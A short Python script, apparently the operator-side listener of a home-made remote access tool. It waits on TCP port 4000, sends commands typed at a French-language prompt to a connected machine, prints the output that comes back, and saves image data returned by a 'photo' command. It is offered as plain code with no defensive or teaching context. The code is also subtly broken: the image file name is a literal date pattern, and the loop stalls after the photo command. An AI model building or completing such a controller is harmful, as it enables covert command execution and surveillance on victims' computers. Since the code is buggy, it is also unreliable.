import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

SERVER_HOST = ""
SERVER_PORT = 4000
BUFFER_SIZE = 500000


s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
conn, addr = s.accept()
print("{}connected !".format(addr))

command = ""

while command != "exit":
    if command == "photo": 
        data = conn.recv(BUFFER_SIZE)
        with open("%d-%m-%Y_%H-%M-%S", "wb") as img_file:
            img_file.write(data)

    else:
        command = input("Entre une commande s'il te plait ISSOU:")
        conn.send(command.encode())
        data = conn.recv(BUFFER_SIZE).decode("cp850")
        print(data)

conn.close()
s.close()